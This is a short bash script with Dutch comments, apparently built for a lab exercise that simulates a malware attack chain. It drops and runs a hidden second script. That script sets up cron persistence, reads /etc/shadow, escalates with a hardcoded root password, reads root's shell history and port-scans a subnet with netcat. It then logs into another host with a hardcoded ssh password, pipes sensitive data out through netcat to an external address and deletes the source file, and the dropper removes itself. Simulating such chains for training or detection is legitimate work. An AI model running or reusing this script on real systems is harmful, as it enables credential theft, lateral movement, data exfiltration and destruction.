#!/bin/bash
echo "dit is een malware phising test" >> downloaded_Malware.txt

# idee:
# dit script wordt al gerund door een user genaamd john

echo "
#!/bin/bash
###real malware script

bash -c'cat >> /crontab.txt << EOF
* * * * * bash .test.sh &
EOF
$ crond -c /crontab.txt'

### weak permissions, cred access
cat /etc/shadow

### cracking password, priv esc
# root password is root

### persistence
su - root <<! >/dev/null 2>&1
root
bash -c 'cat >> /crontab.txt << EOF
* * * * * bash .test.sh &
EOF
$ crond -c /crontab.txt'
!

### found creds, lateral movement
su - root <<! >/dev/null 2>&1
root
cat /root/.ash_history > /dev/tty
!

# netcat scan network
# local IP addresses
# ip address found in getmail script
for i in $(seq 1 254); do for j in $(seq 1 1000); do nc -v -n -z -w 1 172.16.0.$i $j; done; done

# found ssh commando in command log
### collect ftp data, collection
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'ls /*'
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'cat /sensitivedata.txt'

### download data exfiltration
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'cat /sensitivedata.txt | nc 10.0.0.4 5555'

### delete of encrypt data impact
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'rm /sensitivedata.txt'

" > .test.sh

bash .test.sh &

rm -f malware.sh
